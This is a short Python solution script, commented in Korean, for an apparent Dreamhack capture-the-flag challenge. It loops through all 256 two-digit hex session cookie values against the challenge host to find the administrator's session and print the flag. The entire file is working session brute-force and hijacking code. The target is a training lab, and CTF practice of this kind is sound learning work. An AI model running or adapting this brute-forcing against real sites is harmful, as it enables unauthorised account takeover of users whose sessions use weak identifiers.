import requests

# 1. 대상 URL 설정
url = "http://host3.dreamhack.games:9912/"

print("공격을 시작합니다. 잠시만 기다려주세요...")

# 2. 0부터 255(0xFF)까지 반복
for i in range(256):
    # 16진수 소문자 2자리 형태(00, 01, ..., ff)로 변환
    session_id = f"{i:02x}"
    
    # 쿠키 설정
    cookies = {
        'sessionid': session_id
    }
    
    try:
        # GET 요청 보내기
        response = requests.get(url, cookies=cookies)
        
        # 3. 응답 내용에서 플래그나 관리자 텍스트 확인
        # 드림핵 플래그 형식인 'DH{' 가 포함되어 있는지 확인합니다.
        if "DH{" in response.text or "flag is" in response.text:
            print(f"\n[+] 성공! 관리자 세션을 찾았습니다: {session_id}")
            
            # 플래그 부분만 추출해서 출력 (간단한 처리)
            if "DH{" in response.text:
                start_idx = response.text.find("DH{")
                end_idx = response.text.find("}", start_idx) + 1
                print(f"[!] FLAG: {response.text[start_idx:end_idx]}")
            else:
                print(f"응답 내용: {response.text}")
            
            break # 찾으면 반복 중단
            
    except Exception as e:
        print(f"오류 발생: {e}")
        break

    # 진행 상황 표시 (선택 사항)
    if i % 20 == 0:
        print(f"현재 시도 중... ({session_id}/ff)")

print("\n작업이 완료되었습니다.")








